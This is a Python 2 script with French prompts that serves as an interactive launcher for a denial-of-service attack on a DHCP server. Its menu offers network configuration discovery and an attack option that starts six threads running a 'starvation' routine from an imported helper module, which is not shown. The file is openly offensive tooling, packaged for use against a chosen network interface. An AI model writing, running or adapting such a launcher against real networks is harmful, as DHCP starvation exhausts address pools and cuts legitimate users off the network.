#!/usr/bin/python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys, signal
import scapy
from scapy.all import *
import dhcpTools
import threading

conf.verb=0



def DHCPtester():
		
		
	print "\t\t\t\t------------Script de lancement d'attaque DOS sur DHCP---------------------"
     
	try:
		interface=raw_input("Veuiller entrer l'interafce reseau a utiliser :")
		while True:	
			print "\n\t\t\t\t\t\tMENU:"
			print """
                        1.Decouvrir les paramatres de configuration du reseau
                        2.Lancer une attaque DOS sur le serveur DHCP
                        3.Changer l'interafce reseau
                        4.Arreter/Quitter le script
                        """
                        rep=raw_input("Veuillez choisir une action a effectuer : ")
                        if rep=="1":
                                dhcpTools.get_configuration(interface)
                        elif rep=="2":
				print 'Attaque en cours ...'
				lock = threading.Lock()
				threads=[]
				try:
					for i in range(6):
						thread= threading.Thread(target=dhcpTools.starvation, args=(interface,lock,))
						threads.append(thread)
						thread.setDaemon(True)
						thread.start()
					
					while True:
						pass				
				except Exception as e:
					print e
				
                        elif rep=="3":
                                interface=raw_input("Entrez le nom de l-interface a utiliser :")

                        elif rep=="4":
                                break
                        else:
                                print("\n Option inconnue , veuillez ressayer de nouveau.")

			
	except Exception as e  :
		print 'Erreur main'+str(e)
                sys.exit(1)




